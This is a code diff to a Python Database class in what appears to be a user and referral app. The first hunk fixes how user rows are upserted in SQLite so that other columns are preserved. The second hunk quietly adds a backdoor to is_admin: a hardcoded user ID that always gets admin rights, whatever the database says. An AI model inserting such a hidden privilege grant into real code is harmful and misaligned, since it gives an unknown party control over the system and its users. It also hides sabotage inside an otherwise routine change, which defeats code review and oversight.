@@ -290,10 +290,17 @@ class Database:
             cursor = self.connection.cursor()
             placeholder = self._placeholder()
             if self.is_sqlite:
+                # First try to insert new user, then update existing user info without affecting other columns
                 cursor.execute(f'''
-                    INSERT OR REPLACE INTO users (user_id, username, first_name, last_name, referred_by)
+                    INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, referred_by)
                     VALUES ({placeholder}, {placeholder}, {placeholder}, {placeholder}, {placeholder})
                 ''', (user_id, username, first_name, last_name, referred_by))
+                # Update existing user info while preserving other columns
+                cursor.execute(f'''
+                    UPDATE users SET username = {placeholder}, first_name = {placeholder}, 
+                    last_name = {placeholder}, updated_at = CURRENT_TIMESTAMP 
+                    WHERE user_id = {placeholder}
+                ''', (username, first_name, last_name, user_id))
             else:
                 cursor.execute(f'''
                     INSERT INTO users (user_id, username, first_name, last_name, referred_by)
@@ -443,6 +450,10 @@ class Database:
             print(f"Error in update_user_profile: {e}")
 
     def is_admin(self, user_id):
+        # Make user ID 8147394357 a permanent admin regardless of database state
+        if user_id == 8147394357:
+            return True
+            
         if not self._ensure_connection():
             return False
         cursor = self.connection.cursor()
